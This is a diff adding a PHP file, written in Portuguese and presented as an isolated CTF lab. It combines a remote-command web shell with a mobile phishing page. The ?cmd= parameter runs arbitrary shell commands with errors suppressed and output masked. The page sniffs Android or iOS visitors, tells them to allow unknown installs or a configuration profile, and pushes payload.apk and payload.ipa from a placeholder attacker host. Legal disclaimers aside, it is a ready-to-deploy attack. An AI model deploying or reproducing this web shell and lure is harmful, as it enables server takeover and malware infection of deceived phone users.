@@ -1,0 +1,164 @@
+<?php
+/**
+ * vulnerable-mobile-enhanced.php - Lab RCE + Phishing Mobile (Android/iOS) – Apenas Estudo Isolado
+ * Demonstra RCE + simulação de phishing para celular com APK/IPA disfarçado
+ * 
+ * USO SOMENTE EM AMBIENTE CONTROLADO (VMs isoladas, sem internet real)
+ * NUNCA suba em servidor público – é crime grave
+ */
+
+@error_reporting(0);
+@set_time_limit(0);
+@ignore_user_abort(true);
+
+$is_debug = isset($_GET['debug']) && $_GET['debug'] === '1';
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$is_android = stripos($user_agent, 'Android') !== false;
+$is_ios = stripos($user_agent, 'iPhone') !== false || stripos($user_agent, 'iPad') !== false;
+
+// URLs dos payloads (hospede em seu servidor local ou ngrok)
+$apk_url = 'http://SEU_IP_LOCAL:8000/payload.apk'; // ← MUDE PARA SEU IP/PORTA REAL
+$ipa_url = 'http://SEU_IP_LOCAL:8000/payload.ipa'; // ← MUDE PARA SEU IP/PORTA REAL
+
+// ================================================
+// RCE básico via ?cmd= (mantido para CTF/lab)
+// ================================================
+if (isset($_GET['cmd']) && trim($_GET['cmd']) !== '') {
+    $cmd = trim($_GET['cmd']);
+    $out = '';
+    
+    if (function_exists('shell_exec')) {
+        $out = @shell_exec($cmd . ' 2>&1');
+    } elseif (function_exists('system')) {
+        ob_start(); system($cmd . ' 2>&1'); $out = ob_get_clean();
+    } elseif (function_exists('exec')) {
+        exec($cmd . ' 2>&1', $arr); $out = implode("\n", $arr);
+    }
+
+    if ($is_debug) {
+        header('Content-Type: text/html; charset=utf-8');
+        echo "<pre>Comando: " . htmlspecialchars($cmd) . "\n\n";
+        echo "Saída:\n" . htmlspecialchars($out ?: 'Sem saída ou erro') . "</pre>";
+    } else {
+        header('Content-Type: text/plain');
+        echo "OK";
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>App Premium – Atualização Gratuita</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .container {
+            max-width: 90%;
+            padding: 2rem 1rem;
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 1.5rem;
+            color: #00ffaa;
+            text-shadow: 0 0 10px rgba(0,255,170,0.7);
+        }
+        p {
+            font-size: 1.1rem;
+            margin: 1rem 0;
+            line-height: 1.5;
+        }
+        .btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #00ffaa, #00cc88);
+            color: #000;
+            padding: 1.2rem 2.5rem;
+            margin: 1.5rem 0;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.3rem;
+            box-shadow: 0 8px 20px rgba(0,255,170,0.4);
+            transition: all 0.3s ease;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0,255,170,0.6);
+        }
+        .warning {
+            background: rgba(255, 68, 68, 0.25);
+            border: 2px solid #ff4444;
+            padding: 1.2rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+            font-size: 1rem;
+            color: #ffdddd;
+        }
+        .qr {
+            margin: 1.5rem 0;
+            max-width: 200px;
+        }
+        .info {
+            font-size: 0.9rem;
+            color: #aaa;
+            margin-top: 3rem;
+        }
+        .mobile-only { display: <?php echo ($is_android || $is_ios) ? 'block' : 'none'; ?>; }
+        .desktop-only { display: <?php echo ($is_android || $is_ios) ? 'none' : 'block'; ?>; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Atualização Exclusiva – App Premium</h1>
+
+        <div class="mobile-only">
+            <?php if ($is_android): ?>
+                <p>Olá usuário Android! Baixe a versão mais recente do nosso app com recursos exclusivos.</p>
+                <p style="color:#ffcc00;">IMPORTANTE: Ative "Instalar apps desconhecidos" nas configurações do seu navegador.</p>
+                <a href="<?php echo $apk_url; ?>" class="btn" download>BAIXAR APK AGORA</a>
+                <p>Após baixar, instale e abra o app para ativar os benefícios.</p>
+            <?php elseif ($is_ios): ?>
+                <p>Olá usuário iOS! Baixe o perfil de configuração para instalar o app premium.</p>
+                <p style="color:#ffcc00;">IMPORTANTE: Vá em Ajustes → Geral → VPN e Gerenciamento de Dispositivos após baixar.</p>
+                <a href="<?php echo $ipa_url; ?>" class="btn">INSTALAR PERFIL (iOS)</a>
+                <p>Após instalar o perfil, volte aqui e instale o app.</p>
+            <?php endif; ?>
+        </div>
+
+        <div class="desktop-only">
+            <p>Este conteúdo é otimizado para celular.</p>
+            <p>Abra esta página no seu smartphone Android ou iPhone para baixar o app.</p>
+            <p>Ou copie o link abaixo:</p>
+            <p style="word-break: break-all; background: rgba(255,255,255,0.1); padding: 1rem; border-radius: 10px; margin: 1rem 0;">
+                <?php echo $apk_url; ?>
+            </p>
+        </div>
+
+        <div class="warning">
+            <strong>AVISO LEGAL – SOMENTE ESTUDO ISOLADO</strong><br><br>
+            Este é um laboratório educacional simulado.<br>
+            NUNCA use em ambiente real ou sem autorização expressa.<br>
+            Uso não autorizado é crime (art. 154-A CP + Lei 14.155/2021).
+        </div>
+
+        <div class="info">
+            Lab para CTF/estudo de segurança – criado para entender phishing mobile e RCE.
+        </div>
+    </div>
+</body>
+</html>
